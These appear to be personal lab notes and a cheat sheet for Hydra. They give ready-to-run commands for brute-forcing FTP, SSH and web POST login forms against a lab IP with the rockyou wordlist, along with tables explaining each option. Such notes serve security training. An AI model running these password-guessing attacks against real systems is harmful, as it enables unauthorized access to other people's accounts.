
---
# Hydra
- brute force online password cracking program
- hacking tool
- https://en.kali.tools/?p=220

---
`hydra -l user -P passlist.txt ftp://MACHINE_IP` 

### SSH

`hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`

| Option | Description                            |
| ------ | -------------------------------------- |
| `-l`   | specifies the (SSH) username for login |
| `-P`   | indicates a list of passwords          |
| `-t`   | sets the number of threads to spawn    |
Example : 
`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.136.246 -t 4 ssh` 



--- 
### Post Web Form

We can use Hydra to brute force web forms, too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra <username> <wordlist> 10.82.136.246 http-post-form "<path>:<login_credentials>:<invalid_response>"`

|Option|Description|
|---|---|
|`-l`|the username for (web form) login|
|`-P`|the password list to use|
|`http-post-form`|The type of the form is POST|
|`<path>`|the login page URL, for example, `login.php`|
|`<login_credentials>`|the username and password used to log in, for example, `username=^USER^&password=^PASS^`|
|`<invalid_response>`|part of the response when the login fails|
|`-V`|verbose output for every attempt|

`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.136.246 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V`
